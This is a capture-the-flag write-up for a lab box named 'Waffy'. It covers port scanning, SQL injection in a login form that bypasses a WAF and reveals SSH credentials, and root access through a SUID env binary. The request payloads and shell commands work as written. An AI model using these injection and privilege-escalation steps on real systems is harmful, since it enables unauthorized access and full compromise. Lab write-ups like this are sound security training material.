---
icon: flag
---

# Waffy

## Recon

### Nmap

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 72:1f:e1:92:70:3f:21:a2:0a:c6:a6:0e:b8:a2:aa:d5 (ECDSA)
|_  256 8f:3a:cd:fc:03:26:ad:49:4a:6c:a1:89:39:f9:7c:22 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## :80

* whatweb scan reports a 403 forbidden
* replacing the user agent gives information

```bash
$whatweb --user-agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36' http://172.17.0.2/ | tee -a ww.out

http://172.17.0.2/ [200 OK] Apache[2.4.58],
Cookies[PHPSESSID], Country[RESERVED][ZZ], 
HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)],
IP[172.17.0.2],
PasswordField[password],
Title[Iniciar Sesión]
```

### SQLI

#### Recon

* Apostrophe test -> sql error
* MariaDB

Request: `GET /index.php?name=%27&password=PASSWORD123&submit=Login`

Response: `SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'PASSWORD123'' at line 1`

> points of interest:
> * 'PASSWORD123'''
> * the PasswordField is related to the sqli

> hypothesis:
> * sqli reveals credentials
> * ~~sqli common parameters are blocked and need a special form on injection~~

Request:

`GET /index.php?name=%27%29&password=x&submit=Login HTTP/1.1`

Response:

`SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ')' AND passwd = 'x'' at line 1`

#### Exploit

Request:

`GET /index.php?name=%27&password=or+1%3D1--+-&submit=Login`

Response:

/admin.php

```
¡Bienvenido, balutin! 🎉
¡Felicidades! Has logrado hacer un bypass del WAF con éxito.

A continuación tienes los datos de acceso SSH:

Usuario: baluton Contraseña: balulerobalulon
Recuerda: ¡Con gran poder viene gran responsabilidad!
```

## :22

### Access as "baluton"

#### Recon

* suid binaries

```bash
$ find / -type f -perm -4000 2>/dev/null
/usr/bin/chfn
/usr/bin/su
/usr/bin/umount
/usr/bin/mount
/usr/bin/env
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
```

* `env`+`suid` has a privesc exploit method https://gtfobins.github.io/gtfobins/env/#suid

#### Exploit - Root

```bash
baluton@3dd13cac628a:~$ env /bin/sh -p
# whoami
root
```
